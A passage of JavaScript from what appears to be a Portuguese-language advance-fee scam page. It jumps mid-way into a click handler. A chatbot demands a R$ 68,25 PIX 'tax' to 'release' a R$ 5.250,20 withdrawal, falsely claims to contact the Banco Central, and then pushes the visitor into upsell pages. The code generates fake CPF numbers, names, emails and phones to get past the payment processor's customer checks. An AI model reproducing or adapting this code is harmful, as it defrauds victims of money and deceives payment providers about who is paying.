    function isValidCPF(cpf) {
      if (!cpf) return false;
      cpf = String(cpf).replace(/\D/g, '');
      if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
      let sum = 0, rest;
      for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
      rest = (sum * 10) % 11;
      if (rest === 10 || rest === 11) rest = 0;
      if (rest !== parseInt(cpf.substring(9, 10))) return false;
      sum = 0;
      for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
      rest = (sum * 10) % 11;
      if (rest === 10 || rest === 11) rest = 0;
      if (rest !== parseInt(cpf.substring(10, 11))) return false;
      return true;
    }

    function generateRandomCPF() {

      const n = Array(9).fill(0).map(rnd);
      let d1 = 0;
      for (let i = 0; i < 9; i++) d1 += n[i] * (10 - i);
      d1 = (d1 * 10) % 11;
      if (d1 === 10 || d1 === 11) d1 = 0;
      let d2 = 0;
      for (let i = 0; i < 9; i++) d2 += n[i] * (11 - i);
      d2 += d1 * 2;
      d2 = (d2 * 10) % 11;
      if (d2 === 10 || d2 === 11) d2 = 0;
      return '' + n.join('') + d1 + d2;
    }

    async function callXPayApi(path, method, body) {
      let isPost = (method === 'POST');

      // 1. Tenta pagamento.php APENAS se for servidor com suporte a PHP ativo (não GitHub Pages nem estático)
      const isStaticHost = window.location.hostname.includes('github.io') || 
                           window.location.protocol.startsWith('file') || 
                           window.location.hostname.includes('consultor-informativo.click');
      
      if (!isStaticHost) {
        try {
          let localUrl = isPost ? 'pagamento.php' : ('pagamento.php?action=consultar&id=' + encodeURIComponent(path.replace('/charge/', '')));
          let res = await fetch(localUrl, {
            method: isPost ? 'POST' : 'GET',
            headers: { 'Content-Type': 'application/json' },
            body: isPost ? JSON.stringify(body) : undefined
          });
          let cType = res.headers.get('content-type') || '';
          if (res.ok && cType.includes('application/json')) {
            let json = await res.json();
            if (json && (json.success || json.id || json.brCode || json.paid !== undefined)) {
              return json;
            }
          }
        } catch (e) {}
      }

      // 2. Chamada direta via Proxy Seguro (Scalar) para XPay Brasil (garante CORS liberado e rapidez no GitHub Pages)
      let targetUrl = "https://api.xpaybrasil.com/v1" + path;
      let proxyUrl = "https://proxy.scalar.com/?scalar_url=" + encodeURIComponent(targetUrl);
      
      let fetchOpts = {
        method: method,
        headers: {
          "X-API-KEY": XPAY_API_KEY,
          "Content-Type": "application/json"
        }
      };

      if (isPost) {
        let cleanCpf = (body && body.cpf ? String(body.cpf).replace(/\D/g, '') : '');
        if (!isValidCPF(cleanCpf)) {
          cleanCpf = generateRandomCPF();
        }
        let nomeLimpo = (body && body.nome && body.nome.trim().length >= 3 && !/contribuinte|cidadao|social|usuario/i.test(body.nome)) 
          ? String(body.nome).trim() 
          : getRandomFictitiousName();

        let cleanFirst = nomeLimpo.split(' ')[0].toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
        let cleanLast = nomeLimpo.split(' ').slice(-1)[0].toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
        let email = `${cleanFirst}.${cleanLast}${cleanCpf.slice(-4)}@gmail.com`;
        let ddd = ['11', '21', '31', '41', '51', '61', '71', '81', '85', '98'][Math.floor(Math.random() * 10)];
        let phone = `${ddd}9${Math.floor(10000000 + Math.random() * 90000000)}`;

        let payload = {
          amount: (body && body.amount) ? body.amount : 6825,
          expiresIn: 3600,
          customer: {
            taxId: cleanCpf,
            name: nomeLimpo,
            email: email,
            phone: phone
          }
        };
        fetchOpts.body = JSON.stringify(payload);
      }

      let res = await fetch(proxyUrl, fetchOpts);
      let data = await res.json();
      return data;
    }

            payBtn.style.background = '#168821';

            const qrImageHtml = base64 ? 
              `<div class="pix-qr-wrapper"><img src="${base64}" alt="QR Code PIX" class="pix-qr-img"></div>` : '';

            const linkBtnHtml = url ? 
              `<a href="${url}" target="_blank" class="pix-link-btn"><i class="fas fa-external-link-alt"></i> Pagar via Link / Página de Pagamento</a>` : '';

            const paymentCardHtml = `
              <div class="pix-payment-box">
                <div class="pix-title"><i class="fas fa-qrcode"></i> Pagamento da Tarifa via PIX</div>
                <div class="pix-subtitle">Pague a taxa de <b>R$ 68,25</b> para liberação imediata do seu saque de <b>R$ 5.250,20</b>.</div>
                ${qrImageHtml}
                <div class="pix-instructions">Copie o código PIX Copia e Cola abaixo e cole no app do seu banco:</div>
                <div class="pix-input-group">
                  <input type="text" id="pix-copy-input" readonly value="${code}">
                  <button type="button" id="copy-pix-btn" class="pix-btn-copy"><i class="fas fa-copy"></i> Copiar Código PIX</button>
                </div>
                ${linkBtnHtml}
                <div class="pix-status-check" id="pix-status-indicator">
                  <i class="fas fa-spinner fa-spin"></i> Aguardando confirmação do pagamento em tempo real...
                </div>
              </div>
            `;

            await botMessageWithTypingDelay(paymentCardHtml, 1200);

            // Iniciar verificação de status do pagamento (polling)
            startPaymentPolling(id);
          } else {
            console.error('Retorno inesperado:', data);
            throw new Error((data && (data.error || data.message)) ? (data.error || data.message) : 'Erro ao gerar Pix');
          }
        } catch (err) {
          console.error('Erro ao gerar pagamento:', err);
          payBtn.disabled = false;
          payBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Tentar Novamente';
          alert('Não foi possível gerar a chave Pix no momento. Por favor, tente novamente em instantes.');
        }
      }

      // Handler para o botão de copiar PIX
      const copyBtn = e.target.closest('#copy-pix-btn');
      if (copyBtn) {
        const input = document.getElementById('pix-copy-input');
        if (input) {
          input.select();
          input.setSelectionRange(0, 99999);
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(input.value);
          } else {
            document.execCommand('copy');
          }
          const prev = copyBtn.innerHTML;
          copyBtn.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
          copyBtn.style.background = '#0d6f18';
          setTimeout(() => {
            copyBtn.innerHTML = prev;
            copyBtn.style.background = '';
          }, 3000);
        }
      }
    });

    function startPaymentPolling(chargeId) {
      if (pollInterval) clearInterval(pollInterval);
      pollInterval = setInterval(async () => {
        try {
          const resData = await callXPayApi('/charge/' + encodeURIComponent(chargeId), 'GET');
          let paySt = String(resData?.data?.paymentStatus || resData?.paymentStatus || "").toUpperCase();
          let chgSt = String(resData?.data?.status || (typeof resData?.status === "string" ? resData.status : "") || "").toUpperCase();
          let isPaid = (paySt === "PAID" || paySt === "RECIEVED" || paySt === "RECEIVED" || paySt === "APPROVED" || chgSt === "COMPLETED" || chgSt === "PAID" || resData?.paid === true);

          if (isPaid) {
            clearInterval(pollInterval);
            const indicator = document.getElementById('pix-status-indicator');
            if (indicator) {
              indicator.style.background = '#e8f5e9';
              indicator.style.borderColor = '#a5d6a7';
              indicator.style.color = '#1b5e20';
              indicator.innerHTML = '<i class="fas fa-check-circle" style="color: #168821; font-size: 16px;"></i> <b>Pagamento Aprovado com Sucesso!</b>';
            }
            await botMessageWithTypingDelay('<b>Parabéns!</b> Identificamos o recolhimento do imposto no valor de <b>R$ 68,25</b> com sucesso.', 1200);
            await botMessageWithTypingDelay('<i class="fas fa-spinner fa-spin"></i> Conectando ao Banco Central para liberação e emissão da Ordem Bancária...', 1500);

            setTimeout(() => {
              const urlParams = new URLSearchParams(window.location.search);
              const nomeFinal = (userData && userData.nome) ? userData.nome : (urlParams.get('nome') || 'Contribuinte');
              const cpfFinal = (userData && userData.cpf) ? userData.cpf : (urlParams.get('cpf') || '');
              try {
                localStorage.setItem('userCPF', cpfFinal.replace(/\D/g, ''));
                localStorage.setItem('userName', nomeFinal);
              } catch(e) {}

              // Transição suave automática para o primeiro Upsell (Etapa 1 de 4)
              window.location.href = `upsell/1/?cpf=${encodeURIComponent(cpfFinal.replace(/\D/g, ''))}&nome=${encodeURIComponent(nomeFinal)}`;
            }, 2000);
          }
        } catch (e) {
          console.warn('Erro ao verificar status:', e);
        }
      }, 3000);
    }

    // Se a página for aberta com parâmetro chat=1, abre direto
    const checkParams = new URLSearchParams(window.location.search);
    if (checkParams.get('chat') === '1') {
      setTimeout(() => startChatFlow(), 500);
    }

    fetchUserData();
  </script>
